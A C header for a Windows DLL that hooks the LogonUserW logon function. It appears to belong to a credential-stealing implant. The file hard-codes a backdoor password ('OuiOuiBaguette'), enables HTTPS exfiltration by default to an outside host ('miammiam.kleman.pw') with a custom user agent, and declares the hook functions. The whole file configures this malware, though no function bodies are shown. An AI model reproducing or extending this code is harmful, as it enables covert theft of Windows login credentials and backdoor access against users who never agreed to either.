#ifndef _DLLMAIN_H
#define _DLLMAIN_H

#include <windows.h>
#include <winbase.h>
#include <string.h>
#include <stdbool.h>

#include "mhook.h"
#include "debug.h"
#include "https.h"

#ifndef DEBUG
#define DEBUG 0
#endif

#ifndef ROGUE_PASSWORD
#define ROGUE_PASSWORD "OuiOuiBaguette"
#endif

#ifndef HTTPS_EXFILTRATION
#define HTTPS_EXFILTRATION 1
#endif

#ifndef HTTPS_ENDPOINT
#define HTTPS_ENDPOINT "miammiam.kleman.pw"
#endif

#ifndef USERAGENT
#define USERAGENT "OUIOUI BAGUETTE"
#endif

#define PSTR_TO_PWSTR_HELPER(x) L##x
#define PSTR_TO_PWSTR(x) PSTR_TO_PWSTR_HELPER(x)

BOOL HookLogonUserW(LPCWSTR, LPCWSTR, LPCWSTR, DWORD, DWORD, PHANDLE);
BOOL SetupLogonUserWHook();

#endif